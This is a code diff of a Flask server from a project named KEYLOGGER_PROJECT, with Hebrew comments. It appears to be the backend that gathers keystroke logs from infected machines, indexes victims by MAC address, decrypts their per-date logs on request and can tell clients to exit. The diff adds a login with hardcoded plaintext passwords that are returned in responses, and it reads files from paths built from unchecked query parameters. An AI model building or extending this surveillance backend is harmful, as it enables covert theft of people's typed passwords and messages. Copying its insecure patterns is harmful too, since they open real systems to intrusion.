@@ -1,6 +1,7 @@
+import ast
 import os
 
-from flask import Flask, render_template, Blueprint, jsonify, request
+from flask import Flask, render_template, Blueprint, jsonify, request, send_file
 import requests
 import json
 import time
@@ -10,34 +11,65 @@ from getmac import get_mac_address
 from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt
 
 
-
-with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
-    json.dump({'flask':True}, f)
-
-
 app = Flask(__name__)
 CORS(app)
 
 
-approved_login = {}
 
+# מילון דוגמה של משתמשים וסיסמאות
+users = {
+    "ברלה": "1234",
+    "דוד": "4321",
+    "שולמן": "1423"
+}
 
-@app.route('/login', methods=['POST'])
+# מעקב אחרי ניסיונות כושלים לכל משתמש
+failed_attempts = {}
+
+@app.route('/login', methods=['POST', 'OPTIONS'])
 def login():
-    login_dic = dict(request.json)
-    username = login_dic['user']
-    password = login_dic['password']
-    try:
-        if approved_login[username] == password:
-            return render_template()
-    except:
-        return jsonify({'status':'access denied'}), 400
+    # טיפול בבקשות OPTIONS (Preflight)
+    if request.method == 'OPTIONS':
+        return jsonify({}), 200
+
+    data = request.get_json()
+    username = data.get("username", "").strip()
+    password = data.get("password", "").strip()
+
+    # אם למשתמש כבר נרשמו 3 ניסיונות שגויים, נחסם
+    if username in failed_attempts and failed_attempts[username] >= 3:
+        return jsonify(False)
+
+    # בדיקה אם המשתמש קיים במערכת
+    if username in users:
+        # אם הסיסמה נכונה – מחזירים את הנתונים
+        if users[username] == password:
+            failed_attempts[username] = 0  # איפוס נסיונות
+            return jsonify({"name": username, "password": password})
+            # return render_template("index_david.html")    #'''כאן צריך לשלוח אותו לדף HTML'''
+        else:
+            # עדכון נסיונות שגויים
+            failed_attempts[username] = failed_attempts.get(username, 0) + 1
+            if failed_attempts[username] >= 3:
+                return jsonify(False)
+            return jsonify({"name": username, "password": False})
+    else:
+        # המשתמש לא קיים – מחזירים שהמפתח name הוא False
+        return jsonify({"name": False})
+
+
+
+
+
+@app.route('/get_macs', methods=['GET'])
+def send_macs():
+    macs = [ name.replace('-', ':').replace('_info','') for name in os.listdir(r'C:\Users\User\Desktop/keylogger_data') if os.path.isdir(os.path.join(r'C:\Users\User\Desktop/keylogger_data', name))]
+    return jsonify(macs), 200
 
 
 @app.route('/get_by_mac', methods=['GET'])
 def get_by_mac():
     mac_address = request.args['mac']
-    print(mac_address)
     try:
         with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
             dic_mac = json.loads(f.read())
@@ -50,31 +82,20 @@ def get_by_mac():
         return jsonify({'status':'mac not available'}), 400
 
 
-@app.route('/get_by_mac/get_by_date', methods=['GET'])
+@app.route('/get_by_date', methods=['GET'])
 def get_by_date():
-    date = request.args['date']
+    date = request.args.get('date')
+    mac = request.args.get('mac')
+    key = Decrypt.get_key(mac)
+    path = fr'C:\Users\User\Desktop/keylogger_data/{mac.replace(':', '-')}_info/{date}'
     try:
-        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
-            for mac in f:
-                if mac == date:
-                    files = os.listdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
-                    return files, 200
-        return jsonify({'status': 'mac not available'}), 400
-    except:
-        return jsonify({'status':'mac not available'}), 400
-
-
-@app.route('/', methods=['GET'])
-def hello():
-    mac_address = request.args['mac']
-    date_input = request.args['date']
-    with open(fr"C:\Users\User\Desktop\{mac_address.replace(':','-')}.json", 'rb') as f:
-        try:
-            key=Decrypt.get_key(mac_address)
-            dic = dict(Decrypt.decrypt_data(f.read(), key))[mac_address][date_input]
-            return str(dic)
-        except Exception as e:
-            return jsonify({'invalid mac address': e})
+        with open(path, 'r') as f:
+            file_data = f.read()
+            byte_value = ast.literal_eval(file_data)
+            decrypted_data = Decrypt.decrypt_data(byte_value, key)
+            return str(decrypted_data), 200
+    except Exception:
+        return jsonify({'status':'date not available'}), 400
 
 
 @app.route('/add_data', methods=['POST'])
@@ -96,16 +117,21 @@ def add_data():
 
 @app.route('/send_mac', methods=['POST'])
 def send_mac():
+    ''' get the mac '''
     mac = request.data
+    dict_f= {}
+    ''' add the mac to all addresses file '''
+    with open(r'C:\Users\User\Desktop/keylogger_data/Mac_addresses.json', 'a') as f:
+        f.write(mac.decode() + '\n')
     try:
         with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
             dict_f = json.loads(f.read())
+    except:
+        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
             dict_f[mac.decode()] = True
-            with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
-                json.dump(dict_f, file)
-        return jsonify({'post':'successful'}), 200
-    except Exception as e:
-        print(e)
+            json.dump(dict_f, f)
+
+    return jsonify({'post':'successful'}), 200
 
 
 @app.route('/check_status', methods=['GET'])
@@ -121,7 +147,6 @@ def check_status():
         # print(e)
         pass
     return jsonify({'exit': False}), 200
-
 
 
 
